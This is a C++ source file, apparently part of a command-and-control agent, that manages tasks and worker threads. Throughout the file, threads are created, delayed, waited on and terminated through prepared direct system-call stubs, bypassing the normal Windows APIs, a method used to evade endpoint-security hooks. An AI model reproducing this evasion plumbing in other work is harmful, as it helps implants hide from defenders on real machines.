#include "ApcWorkerThread.hpp"
#include "Syscalls.hpp"
#include "Instance.hpp"
#include "SecureString.hpp"
#include "SecureException.hpp"

std::vector<HANDLE> ApcWorkerThread::ApcHandles;
std::vector<ThreadDetails> ApcWorkerThread::Threads;

// Custom copy constructor
SecureTask::SecureTask(const SecureTask& other)
    : ID(other.ID), AgentID(other.AgentID), Timeout(other.Timeout), Active(other.Active),
    Success(other.Success), InQueue(other.InQueue) {
    Command = other.Command ? std::make_unique<SecureString>(*other.Command) : nullptr;
    CreateTime = other.CreateTime ? std::make_unique<SecureString>(*other.CreateTime) : nullptr;
    EndTime = other.EndTime ? std::make_unique<SecureString>(*other.EndTime) : nullptr;
    Result = other.Result ? std::make_unique<SecureString>(*other.Result) : nullptr;

    // Deep copy of Arguments
    for (const auto& arg : other.Arguments) {
        Arguments.push_back(arg ? std::make_unique<SecureString>(*arg) : nullptr);
    }
}

// Custom copy assignment operator
SecureTask& SecureTask::operator=(const SecureTask& other) {
    if (this != &other) {
        ID = other.ID;
        AgentID = other.AgentID;
        Timeout = other.Timeout;
        Active = other.Active;
        Success = other.Success;
        InQueue = other.InQueue;
        Command = other.Command ? std::make_unique<SecureString>(*other.Command) : nullptr;
        CreateTime = other.CreateTime ? std::make_unique<SecureString>(*other.CreateTime) : nullptr;
        EndTime = other.EndTime ? std::make_unique<SecureString>(*other.EndTime) : nullptr;
        Result = other.Result ? std::make_unique<SecureString>(*other.Result) : nullptr;

        Arguments.clear();
        for (const auto& arg : other.Arguments) {
            Arguments.push_back(arg ? std::make_unique<SecureString>(*arg) : nullptr);
        }
    }
    return *this;
}

SecureTask::SecureTask() = default;
SecureTask::~SecureTask() = default;

ApcWorkerThread::ApcWorkerThread() : Running(false), Completed(false), Id(0), Details({NULL, false}), Handle(NULL) {
    SyscallPrepare(SystemCalls::SysTable.SysNtCreateThreadEx.wSyscallNr, SystemCalls::SysTable.SysNtCreateThreadEx.pRecycled);    
    NTSTATUS status = SysNtCreateThreadEx(&Handle, MAXIMUM_ALLOWED, NULL, NtCurrentProcess(), ThreadFunction, this, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        // Do nothing, no thread will be added to the vector and will not be waited on
    }
    else {
        Running.store(true); // Only set to true if thread creation succeeds
        Id = Instance::GetThreadIdFromHandle(Handle);        
        ApcHandles.push_back(Handle);
        Details.Handle = Handle;
        Details.Success = false;
        Threads.push_back(Details);
    }
}

DWORD WINAPI ApcWorkerThread::ThreadFunction(LPVOID lpParam) {
    auto self = static_cast<ApcWorkerThread*>(lpParam);

    while (!self->Completed.load()) {
        LARGE_INTEGER delay;
        // 1/2 second
        LONGLONG lldelay = 500 * 10000LL;
        delay.QuadPart = -lldelay;
        SyscallPrepare(SystemCalls::SysTable.SysNtDelayExecution.wSyscallNr, SystemCalls::SysTable.SysNtDelayExecution.pRecycled);
        SysNtDelayExecution(TRUE, &delay);
    }

    self->Running.store(false);
    self->Details.Success = true;

    auto it = std::remove(ApcHandles.begin(), ApcHandles.end(), self->Handle);
    ApcHandles.erase(it, ApcHandles.end());

    //printf("Thread completed\n");
    return 0;
}

bool ApcWorkerThread::WaitForCompletion(DWORD milliseconds) {
    if (ApcHandles.empty()) {
        // No handles to wait on
        return true;
    }

    LARGE_INTEGER timeout;
    timeout.QuadPart = -static_cast<LONGLONG>(milliseconds) * 10000LL; // Convert to 100-nanosecond units

    SyscallPrepare(SystemCalls::SysTable.SysNtWaitForMultipleObjects.wSyscallNr, SystemCalls::SysTable.SysNtWaitForMultipleObjects.pRecycled);
    NTSTATUS status = SysNtWaitForMultipleObjects(
        ApcHandles.size(), // Number of handles to wait for
        ApcHandles.data(), // Pointer to the handles array
        WaitAll,           // Wait type - wait for all handles
        FALSE,             // Not alertable
        &timeout           // Timeout
    );

    switch (status) {
    case STATUS_WAIT_0:
        // All handles were signaled before the timeout
        return true;
    case STATUS_TIMEOUT:
        // The wait operation timed out, try to find which ones are still running
        for (size_t i = 0; i < Threads.size(); ++i) {
            ThreadDetails details = Threads[i];
            LARGE_INTEGER timeout;
            timeout.QuadPart = 0;

            SyscallPrepare(SystemCalls::SysTable.SysNtWaitForSingleObject.wSyscallNr, SystemCalls::SysTable.SysNtWaitForSingleObject.pRecycled);
            NTSTATUS individualStatus = SysNtWaitForSingleObject(details.Handle, FALSE, &timeout);
            if (NT_SUCCESS(individualStatus)) {
                details.Success = true;
            }
            else {
                // Do not throw an exception, all threads that are not successful will be terminated anyways
                details.Success = false;
			}
        }
        return false;
    default:
        if (NT_SUCCESS(status)) {
            // Successfully waited, but check specific status if needed
            return true;
        }
        else {
            // An error occurred during waiting
            // Do not throw an exception, all threads that are not successful will be terminated anyways
            return false;
        }
    }
}

void ApcWorkerThread::TerminateThreads() {
    if (ApcHandles.empty()) {
		return;
	}

    for (auto& handle : ApcHandles) {
		SyscallPrepare(SystemCalls::SysTable.SysNtTerminateThread.wSyscallNr, SystemCalls::SysTable.SysNtTerminateThread.pRecycled);
        // Don't handle errors, if termination fails we likely can't recover anyways
		SysNtTerminateThread(handle, 0);
	}
    ApcHandles.clear();
	Threads.clear();
}
